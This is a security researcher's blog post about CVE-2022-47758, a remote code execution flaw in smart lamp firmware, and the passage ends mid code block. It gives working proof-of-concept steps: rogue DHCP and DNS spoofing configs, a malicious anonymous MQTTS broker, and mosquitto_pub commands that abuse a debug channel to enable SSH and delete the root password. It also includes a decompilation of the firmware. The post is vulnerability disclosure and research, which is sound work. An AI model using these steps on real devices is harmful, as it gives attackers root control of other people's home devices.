<!DOCTYPE html>
<html lang="en" class="dark-mode">
<head>

    <title>How I hacked smart lights: the story behind CVE-2022-47758</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=484755abd6" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=484755abd6" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=484755abd6" />

    <link rel="icon" href="https://pwning.tech/content/images/size/w256h256/format/png/2024/02/favicon.webp" type="image/png">
    <link rel="canonical" href="https://pwning.tech/cve-2022-47758/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="Pwning Tech">
    <meta property="og:type" content="article">
    <meta property="og:title" content="How I hacked smart lights: the story behind CVE-2022-47758">
    <meta property="og:description" content="Introduction

In this blogpost, we take a closer look at our research regarding CVE-2022-47758: a critical vulnerability impacting a very large number of Internet of Things smart devices. We could leverage this vulnerability in the lamp&#x27;s firmware for unauthenticated remote code execution on the entire device with the highest privileges">
    <meta property="og:url" content="https://pwning.tech/cve-2022-47758/">
    <meta property="og:image" content="https://pwning.tech/content/images/2024/02/logo_twitter_card-1.webp">
    <meta property="article:published_time" content="2023-03-08T07:30:00.000Z">
    <meta property="article:modified_time" content="2024-02-18T21:33:53.000Z">
    <meta property="article:tag" content="Infrastructure">
    <meta property="article:tag" content="Real World">
    <meta property="article:tag" content="x64 Assembly">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="How I hacked smart lights: the story behind CVE-2022-47758">
    <meta name="twitter:description" content="Introduction

In this blogpost, we take a closer look at our research regarding CVE-2022-47758: a critical vulnerability impacting a very large number of Internet of Things smart devices. We could leverage this vulnerability in the lamp&#x27;s firmware for unauthenticated remote code execution on the entire device with the highest privileges">
    <meta name="twitter:url" content="https://pwning.tech/cve-2022-47758/">
    <meta name="twitter:image" content="https://pwning.tech/content/images/2024/02/logo_twitter_card.webp">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="notselwyn">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Infrastructure, Real World, x64 Assembly">
    <meta name="twitter:site" content="@notselwyn">
    <meta property="og:image:width" content="735">
    <meta property="og:image:height" content="600">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Pwning Tech",
        "url": "https://pwning.tech/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://pwning.tech/content/images/2024/02/frontpage_logo-12.svg"
        }
    },
    "author": {
        "@type": "Person",
        "name": "notselwyn",
        "url": "https://pwning.tech/author/notselwyn-2/",
        "sameAs": []
    },
    "headline": "How I hacked smart lights: the story behind CVE-2022-47758",
    "url": "https://pwning.tech/cve-2022-47758/",
    "datePublished": "2023-03-08T07:30:00.000Z",
    "dateModified": "2024-02-18T21:33:53.000Z",
    "keywords": "Infrastructure, Real World, x64 Assembly",
    "description": "Introduction\n\nIn this blogpost, we take a closer look at our research regarding CVE-2022-47758: a critical vulnerability impacting a very large number of Internet of Things smart devices. We could leverage this vulnerability in the lamp&#x27;s firmware for unauthenticated remote code execution on the entire device with the highest privileges and hence abuse it for information gathering (and for haunting someone in their own house). Additionally, we could pivot to the management devices using a vulner",
    "mainEntityOfPage": "https://pwning.tech/cve-2022-47758/"
}
    </script>

    <meta name="generator" content="Ghost 5.75">
    <link rel="alternate" type="application/rss+xml" title="Pwning Tech" href="https://pwning.tech/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="edf92d97a2ffbb07659fa25625" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://pwning.tech/" crossorigin="anonymous"></script>
    
    <link href="https://pwning.tech/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=484755abd6"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=484755abd6">
    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.css" integrity="sha512-Dqf5696xtofgH089BgZJo2lSWTvev4GFo+gA2o4GullFY65rzQVQLQVlzLvYwTo0Bb2Gpb6IqwxYWtoMonfdhQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism-themes/1.9.0/prism-vsc-dark-plus.min.css" integrity="sha512-ML8rkwYTFNcblPFx+VLgFIT2boa6f8DDP6p6go4+FT0/mJ8DCbCgi6S0UdjtzB3hKCr1zhU+YVB0AHhIloZP8Q==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/brands.min.css" integrity="sha512-W/zrbCncQnky/EzL+/AYwTtosvrM+YG/V6piQLSe2HuKS6cmbw89kjYkp3tWFn1dkWV7L1ruvJyKbLz73Vlgfg==" crossorigin="anonymous" referrerpolicy="no-referrer" />

<!-- line numbers
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" integrity="sha512-cbQXwDFK7lj2Fqfkuxbo5iD1dSbLlJGXGpfTDqbggqjHJeyzx88I3rfwjS38WJag/ihH7lzuGlGHpDBymLirZQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-->

<style>
    .gh-head-menu .nav-twitter a,
    .gh-head-menu .nav-github a {
        font-size: 0 !important;
    }

    .gh-head-menu .nav-twitter a::before,
    .gh-head-menu .nav-github a::before {
        font-family: "Font Awesome 6 Brands";
        display: inline-block;
        font-size: 20px;
        font-style: normal;
        font-weight: normal;
        font-variant: normal;
        text-rendering: auto;
        font-smoothing: antialiased;
    }

    .gh-head-menu .nav-twitter a::before {content: "\f099"}
    .gh-head-menu .nav-github a::before {content: "\f09b"}
</style>

<!-- Tocbot Stylesheet -->
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.25.0/tocbot.min.css" integrity="sha512-4q0OX9NAYcRTFEfy9nTK0AV9N7MxM665neDXEW3CjAj1pXc6+8Bcd6ryXl6cY8mTBBXt0aXepnSDLLQZSuJRww==" crossorigin="anonymous" referrerpolicy="no-referrer" />

<!-- Tocbot Inline CSS (Specific Adjustments for the Casper Theme) -->
<style>
   
.gh-content {
    position: relative;
 }

.gh-toc > .toc-list {
    position: relative;
    overflow: hidden;
    padding-left: 10px;
}
    
.toc-list-item a {
    text-decoration: none;
}
    
.toc-list-item {  
    list-style: none !important;
}
    
.toc-list {    
    margin-left: 20px;
}

@media (min-width: 1300px) {
     .gh-sidebar {
        position: absolute; 
        top: 0;
        bottom: 0;
        margin-top: 4vmin;
		margin-left: 20px;
        grid-column: 1 / 3;
    }
   
    .gh-toc {
        position: sticky;
        top: 4vmin;
    }
    
    /* compensate ToC margin (required for scrolling) */
    .article-header {
     	padding-bottom: 10px;   
    }
}

.gh-toc .is-active-link::before {
    background-color: var(--ghost-accent-color);
}
</style>

<style>
	/* fix cover image of blogpost (make it inline with the text) */
	.gh-canvas .article-image {
     	grid-column: 3/3;   
    }
</style>

<style>
  /* set font of entire website */
  body { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:400,600), sans-serif; }
  h1 h2 h3 h4 h5 h6 { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:600), sans-serif; }
</style>

<style>
  /* set codeblock background color to vscode */
  html.dark-mode .gh-content code { background-color: #1e1e1e }
  html.dark-mode .gh-content pre { background-color: #1e1e1e }

  /* set thirtiary colors, for accessibility not to -22% */
  html.dark-mode :is(.post-card-tags, .post-card-meta, .article-tag a, .byline-meta-content, .pagination .page-number) {
    color: var(--color-secondary-text);
  }
</style><style>:root {--ghost-accent-color: #e01b24;}</style>

</head>
<body class="post-template tag-infrastructure tag-real-world tag-x64-assembly tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 is-head-left-logo has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://pwning.tech">
                        <img src="https://pwning.tech/content/images/2024/02/frontpage_logo-12.svg" alt="Pwning Tech">
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://pwning.tech/">Home</a></li>
    <li class="nav-infrastructure"><a href="https://pwning.tech/infra/">Infrastructure</a></li>
    <li class="nav-about"><a href="https://pwning.tech/about/">About</a></li>
    <li class="nav-twitter"><a href="https://twitter.com/notselwyn/">Twitter</a></li>
    <li class="nav-github"><a href="https://github.com/notselwyn/">Github</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-infrastructure tag-real-world tag-x64-assembly tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 no-image ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/infrastructure/">Infrastructure</a>
                </span>
        </div>

        <h1 class="article-title">How I hacked smart lights: the story behind CVE-2022-47758</h1>


        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list">
                <li class="author-list-item">
                    <a href="/author/notselwyn-2/" class="author-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
</a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/notselwyn-2/">notselwyn</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2023-03-08">Mar 8, 2023</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 15 min read</span>
                </div>
            </div>

        </section>
        </div>


    </header>

    <section class="gh-content gh-canvas">
        <h2 id="introduction">Introduction</h2><p>In this blogpost, we take a closer look at our research regarding CVE-2022-47758: a critical vulnerability impacting a very large number of Internet of Things smart devices. We could leverage this vulnerability in the lamp's firmware for unauthenticated remote code execution on the entire device with the highest privileges and hence abuse it for information gathering (and for haunting someone in their own house). Additionally, we could pivot to the management devices using a <a href="https://pwning.tech/cve-2022-46640">vulnerability in the smart lamps' desktop management software</a> (CVE-2022-46640). To make matters more interesting: the vulnerable traffic flowed through an encrypted outbound connection which means that it typically isn't blocked by a firewall. This blogpost serves as a cautionary tale for both vendors and consumers, highlighting the importance of IoT security. Join us as we dive into the technical details and lessons learned from our research.</p><h2 id="proof-of-concept-exploit">Proof of Concept exploit</h2><p>The goal of our proof of concept (PoC) exploit is proving that we can remotely execute code on our own smart lamps. For the PoC exploit we're redirecting local traffic to the vendors MQTT(S) broker to our own machine via malicious DNS records. In practice, an attacker could perform this redirect by committing either a rogue DHCP server attack, hacking a router, hacking a DNS server, et cetera. Once we have control over the MQTT traffic, we send a debugging command to a debugging endpoint on our smart lamp. Finally, we activate a persistent OpenSSH server in order to easily access the lamp.</p><h3 id="methodology">Methodology</h3><p>We use the following methodology in this blogpost:</p><ul><li>*.acme.org - the<strong> </strong>vendor domain names</li><li>mqtt.acme.org - the vendor MQTT broker domain name</li><li>192.168.128.0/24 - our controlled network environment</li><li>192.168.128.10 - our attacker machine</li><li>192.168.128.20 - our vulnerability smart device</li></ul><h3 id="spoofing-dns">Spoofing DNS</h3><p>In order to spoof DNS we need to set up a rogue DHCP server. The Dynamic Host Configuration Protocol (DHCP) is primarily used by network administrators to set the private ip addreses of devices on the network dynamically. However, DHCP packets also have a few more interesting parameters: domain name servers IP addresses, hostnames, and even gateway IP addresses. In order to MitM MQTT traffic to <code>mqtt.acme.org</code>, we are setting the domain name of the smart lamp by creating a malicious DHCP offer - using our rogue DHCP server - which sets the domain name server to <code>192.168.128.10</code>. </p><p>By installing <code>isc-dhcp-server</code> on our Linux install and configuring it to run maliciously on our local network environment (<code>192.168.128.0/24</code>). We want to make the smart lamp use our own DNS resolver over at <code>192.168.128.10</code>.  The configuration we use is as following:</p><figure class="kg-card kg-code-card"><pre><code class="language-conf">subnet 192.168.128.0 netmask 255.255.255.0 {
    range                           192.168.128.10 192.168.128.254;
    option broadcast-address        192.168.128.255;
    option routers                  192.168.128.1;
    option subnet-mask              255.255.255.0;
    option domain-name-servers      192.168.128.10;  # set DNS resolver

    host router {
        hardware ethernet &lt;mac_router&gt;;
        fixed-address 192.168.128.1;
    }

    host attacker {
        hardware ethernet &lt;mac_attacker&gt;;
        fixed-address 192.168.128.10;
    }

    host lamp {
        hardware ethernet &lt;mac_lamp&gt;;
        fixed-address 192.168.128.20;
    }
}</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/dhcp/dhcpd.conf</span></code><span style="white-space: pre-wrap;"> - setup DHCP server to spoof DNS and spoof DNS</span></p></figcaption></figure><p>In order to change the IP address to which <code>mqtt.acme.org</code> points, we need to setup our own DNS resolver by installing <code>bind9</code> and setting a custom DNS record for the zone<code>mqtt.acme.org</code> which points to our own MQTT broker:</p><figure class="kg-card kg-code-card"><pre><code class="language-conf">;
; BIND data file for local loopback interface
;
$TTL	604800
@	IN	SOA	mqtt.acme. root.mqtt.acme.org. (
			      2		; Serial
			 604800		; Refresh
			  86400		; Retry
			2419200		; Expire
			 604800 )	; Negative Cache TTL

;
@	IN	NS	ns.mqtt.acme.org.
ns	IN	A	192.168.128.10
@	IN	A	192.168.128.10</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/bind/named.conf.local</span></code><span style="white-space: pre-wrap;"> - malicious DNS record (redirects traffic to our malicious IP)</span></p></figcaption></figure><h3 id="setting-up-a-malicious-mqtt-broker">Setting up a malicious MQTT broker</h3><p>Since our traffic to <code>mqtt.acme.org</code> now points to our own IP address (<code>192.168.128.10</code>), we can eavesdrop the traffic. However, in order to interact with this traffic, we need to set an MQTT broker up on <code>192.168.128.10</code>. We do this so we can publish to a custom debugging MQTT channel devoted to debugging (custom made by Acme). By publishing on this MQTT channel, we can execute commands. It's important that the server listens on port 443, has TLS encryption and allows anonymous logins. Hence, if the smart lamp tries to connect to <code>mqtts://nobody@mqtt.acme.org:443</code> it should succeed. We configured it by using the following configuration:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash"># Place your local configuration in /etc/mosquitto/conf.d/
#
# A full description of the configuration file is at
# /usr/share/doc/mosquitto/examples/mosquitto.conf.example

listener 443
cafile /etc/mosquitto/ca_certificates/ca.crt
keyfile /etc/mosquitto/certs/server.key
certfile /etc/mosquitto/certs/server.crt
tls_version tlsv1.2
allow_anonymous true
protocol mqtt

persistence true
persistence_location /var/lib/mosquitto/
log_dest file /var/log/mosquitto/mosquitto.log

include_dir /etc/mosquitto/conf.d</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/mosquitto/mosquitto.conf</span></code><span style="white-space: pre-wrap;"> - malicious MQTT(S) broker to allows all logins</span></p></figcaption></figure><p>As you might have noticed, we are dealing with MQTT<strong>S</strong>. Like HTTPS, the S in MQTTS stands for Secure. In order to make such a protocol secure, we need to create TLS certifications so we can encrypt the MQTT trafifc coming from our own MQTT broker. We can create such TLS certifications by running the following command: </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ openssl genrsa -des3 -out /etc/mosquitto/ca_certificates/ca.key 2048
$ openssl req -new -x509 -days 1826 -key /etc/mosquitto/ca_certificates/ca.key -out /etc/mosquitto/certs/ca.crt
$ openssl genrsa -out /etc/mosquitto/certs/server.key 2048</code></pre><figcaption><p><span style="white-space: pre-wrap;">Creating TLS keys/certificates using OpenSSL</span></p></figcaption></figure><h3 id="performing-the-exploit">Performing the exploit</h3><p>Now we have our infrastructure set up, we need to reboot the lamp such that it will trigger a DHCP discover request as part of the Discover Offer Request Accept (DORA) sequence. The next part of the DORA sequence would be 'Offer', where the server offers a new IP address (and our domain name server IP address) to our smart lamp. That offer will set the lamps DNS records of <code>mqtt.acme.org</code> to <code>192.168.128.10</code>. </p><p>We can confirm that the vulnerable smart lamp is using our own MQTT broker by inspecting the local traffic using Wireshark on <code>192.168.128.10</code>. After the victim device has connected to our server, we want to activate an OpenSSH server. In order to do this, we create the <code>/acme/ssh_enabled</code> file which enables persistent SSH access after the device reboots. We could probably do it without rebooting, be it would be a lot more unnecessary effort. After that, we stop the debugging of the touch command, and instead debug <code>passwd -d root</code> which deletes the password for the root user. This is convenient, because the default password is unknown and this way we can set the password without a TTY. Additionally the SSH server allows passwordless logins. In order to pull it off, we execute the following commands using <code>mosquitto_pub</code> (publishes messages to the Mosquitto broker):</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "debug /bin/touch /acme/ssh_enabled" --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "stop" --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "debug /bin/passwd -d root" --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "stop" --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "debug /sbin/reboot" --insecure --cafile /etc/mosquitto/certs/ca.crt</code></pre><figcaption><p><span style="white-space: pre-wrap;">Sending our payloads to our own MQTT broker</span></p></figcaption></figure><p>Once we started the OpenSSH server on the smart lamp, we can log into our smart lamp by simply executing <code>ssh root@192.168.128.20</code>.</p><pre><code class="language-bash">$ ssh root@192.168.128.20

root@192.168.128.20:~ $ uname -a
Linux AcmeProduct-MAC 4.14.195 #0 Sun Sep 6 16:19:39 2020 mips GNU/Linux</code></pre><h2 id="analyzing-the-smart-device-firmware">Analyzing the smart device firmware</h2><p>Since we have access to the firmware, we can analyze the firmware by extracting it using Binwalk - a tool for analyzing and extracting firmware. By running it with the <code>-e</code> (<code>--extract</code>) parameter, we can extract the firmware partitions. In our case, we can see that we have 3 partitions: a bootloader, a kernel, and an OpenWRT install (interestingly enough). </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ binwalk -e 4.5.1.firmware

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
80            0x50            uImage header, header size: 64 bytes, header CRC: 0xF012020D, created: 2020-09-06 16:19:39, image size: 1594132 bytes, Data Address: 0x80000000, Entry Point: 0x80000000, data CRC: 0xFB832D09, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: "MIPS OpenWrt Linux-4.14.195"
144           0x90            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 5029060 bytes
1594276       0x1853A4        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 7060690 bytes, 1210 inodes, blocksize: 262144 bytes, created: 2020-09-06 16:19:39</code></pre><figcaption><p><span style="white-space: pre-wrap;">Binwalk output when extracting the firmware</span></p></figcaption></figure><h3 id="enumerating-the-openwrt-installation">Enumerating the OpenWRT installation</h3><p>The output of Binexp is a SquashFS filesystem instance which got carved out of the extracted partition. SquashFS performs heavy compressions and hence it probably was used by the smart lamp developers because it saves storage costs. Since SquashFS doesn't have different layers such as OverlayFS, we do not have any hassle regarding fixing the FS.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ tree . -L 2
.
├── 4.5.1.firmware
└── squashfs
    ├── bin
    ├── dev
    ├── etc
    ├── lib
    ├── mnt
    ├── acme_config
    ├── overlay
    ├── proc
    ├── rom
    ├── root
    ├── sbin
    ├── sys
    ├── tmp
    ├── usr
    ├── var -&gt; tmp
    └── www</code></pre><figcaption><p><span style="white-space: pre-wrap;">The output directory of binwalk</span></p></figcaption></figure><p>One of the first things we did was verifying with what OS we were working and checking which users existed on the device. After we established that the lamp was running OpenWRT - a router OS interestingly enough - and we couldn't find any custom users in <code>/etc/passwd</code>, we decided to look into the next interesting directory: <code>/acme_config/</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ cat etc/os-release                 
NAME="OpenWrt"
VERSION="19.07.4"
ID="openwrt"
ID_LIKE="lede openwrt"
PRETTY_NAME="OpenWrt 19.07.4"
VERSION_ID="19.07.4"
HOME_URL="https://openwrt.org/"
BUG_URL="https://bugs.openwrt.org/"
SUPPORT_URL="https://forum.openwrt.org/"
BUILD_ID="r11208-ce6496d796"
OPENWRT_BOARD="ramips/mt76x8"
OPENWRT_ARCH="mipsel_24kc"
OPENWRT_TAINTS="no-all busybox"
OPENWRT_DEVICE_MANUFACTURER="OpenWrt"
OPENWRT_DEVICE_MANUFACTURER_URL="https://openwrt.org/"
OPENWRT_DEVICE_PRODUCT="Generic"
OPENWRT_DEVICE_REVISION="v0"
OPENWRT_RELEASE="OpenWrt 19.07.4 r11208-ce6496d796"</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/os-release</span></code><span style="white-space: pre-wrap;"> - OS related information</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ cat etc/passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/passwd</span></code><span style="white-space: pre-wrap;"> - users on the device</span></p></figcaption></figure><p>We started searching in <code>/acme_config/</code> for interesting keywords such as <code>grep -iRPe '(ssh)|(mqtt)|(ftp)|(api)'</code> to find possible exposed services as an attack surface. As we researched the binaries containing the specified keywords, we found out that a particular binary called <code>ColorCC.bin</code> contained the entire smart lamp API accessible via HTTP (built using the OpenAPI C++ SDK). We tried searching for memory corruption bugs for easy RCE but could not find any. Next, a binary called <code>cloud_daemon</code> caught our attention because it contained an MQTT client...</p><h3 id="investigating-the-mqtt-handler">Investigating the MQTT handler</h3><p>In order to grasp the internal logic of the <code>cloud_daemon</code>, we can open it in Ghidra. Ghidra is a software reverse engineering suite developed by the National Security Agency (NSA). We can use Ghidra to decompile Assembly instructions (the raw instructions that go into the CPU) into normal C, which is relatively readable by code monkeys like us.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void main(int argc,char **env)
{
  int iVar1;
  long lVar2;
  int i;
  char **ppcVar3;
  long port;
  char *pcVar4;
  char addr_str [128];
  pthread_t pThread;
  undefined4 uStack_34;
  char *pcStack_30;
  
  printf("This is Cloud Daemon version %s (%s)\n","1.12.0",
         "1.12.0 / Wed Aug 26 09:08:45 EDT 2020 / Backlog0740 / Color_develop");
  signal(2,ctrlc_handler);
  signal(0xf,ctrlc_handler);
  memset(addr_str,0,0x80);
  port = 0;
  do {
    if (argc &lt;= 1) {
      // set MQTT channel variables
      sprintf(&amp;update_server,"acme/device/%s/update/server",&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;update_client,"acme/device/%s/update/client",&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;exec_server,"acme/device/%s/exec/server",&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;exec_client,"acme/device/%s/exec/client",&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;uptime_server,"acme/device/%s/uptime/server",&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;uptime_client,"acme/device/%s/uptime/client",&amp;ROM_SERIAL_NUMBER);

      // print which MQTT channels will be used for what
      printlog(3,"We will publish firmware communications to [%s]\n",&amp;update_client);
      printlog(3,"We will receive firmware communications from [%s]\n",&amp;update_server);
      printlog(3,"We will publish debug communications to [%s]\n",&amp;exec_client);
      printlog(3,"We will receive debug communications from [%s]\n",&amp;exec_server);
      printlog(3,"We will publish health communications to [%s]\n",&amp;uptime_client);
      printlog(3,"We will receive health communications from [%s]\n",&amp;uptime_server);
      
      set_host(addr_str, port);
     
      // creates posix thread to execute the start_firmware_checks() function
      while (iVar1 = pthread_create(&amp;pThread, NULL, start_firmware_checks, &amp;DAT_00414c84), iVar1 != 0 ) {
        printlog(1,"Error creating https upgrade check thread, retrying in %d seconds ...\n",timeout);
        printlog(1,"Error in (func, line): %s, %d\n", &amp;function, 0x41f);
        sleep(timeout);
      }

      printlog(2, "Successfully launched https upgrade check thread\n");
      cloud_pipe_start(&amp;ROM_DEVICE_ID,&amp;ROM_SERIAL_NUMBER, channel, on_disconnect_cb, on_tick_cb, 1000);
      if (DAT_004152f0 != 0) {
        printlog(2, "Rebooting\n");
        system("reboot");
      }
      return;
    }
}
</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>main()</span></code><span style="white-space: pre-wrap;"> function - initializes the MQTT client channels</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code>Client will publish firmware communications to [acme/device/serialno/update/client]
Client will receive firmware communications from [acme/device/serialno/update/server]
Client will publish debug communications to [acme/device/serialno/exec/client]
Client will receive debug communications from [acme/device/serialno/exec/server]
Client will publish health communications to [acme/device/serialno/uptime/client]
Client will receive health communications from [acme/device/serialno/uptime/server]</code></pre><figcaption><p><span style="white-space: pre-wrap;">Communication channels used by MQTT client</span></p></figcaption></figure><p>We can see that <code>cloud_pipe_start()</code> (<code>libcloudpipe.so</code>) is called in <code>main()</code>, which registers several callback functions: <code>cloud_pipe_start(..., ..., register_channels, on_disconnect_cb, on_tick_cb, ...)</code>. The function <code>register_channels</code> is a wrapper for registering handlers for the MQTT channels discussed above.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void register_channels(void)
{
  printlog(2,"Connection up\n");
  cloud_pipe_subscribe(&amp;uptime_server,respond_healthcheck);
  cloud_pipe_subscribe(&amp;update_server,update_firmware);
  cloud_pipe_subscribe(&amp;exec_server,debug);
  return;
}</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>register_channels()</span></code><span style="white-space: pre-wrap;"> - registers the MQTT message handlers per MQTT channel</span></p></figcaption></figure><p>The most interesting handler function sounds like <code>debug</code>, which handles messages on the channel <code>/acme/device/serialno/exec/server</code>. This function handles debug requests: it can execute a binary (debug a process) based on the MQTT requests parameters, or kill the process (stop the debugging). In order to start debugging a binary, we can publish the following the the server exec channel: <code>debug /bin/echo "Hello World!"</code>, of which "Hello World!" should be nicely returned in an MQTT message on the channel <code>/acme/device/serialno/exec/client</code>. When we want to execute another binary or generally stop debugging, we can simply issue a <code>stop</code> command.</p><p>So far, I hope that the following part of the MQTT payload in the PoC exploit makes sense:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash"># create a file called /acme_config/ssh_enabled by 'debugging' /bin/touch
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "debug /bin/touch /acme/ssh_enabled" --insecure --cafile /etc/mosquitto/certs/ca.crt

# stop debugging so we can execute another command
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "stop" --insecure --cafile /etc/mosquitto/certs/ca.crt

# delete (reset) the root password by 'debugging' /bin/passwd
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "debug /bin/passwd -d root" --insecure --cafile /etc/mosquitto/certs/ca.crt

# stop debugging so we can execute another command
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "stop" --insecure --cafile /etc/mosquitto/certs/ca.crt

# reboot to start the OpenSSH server, but we can probably do it without reboot
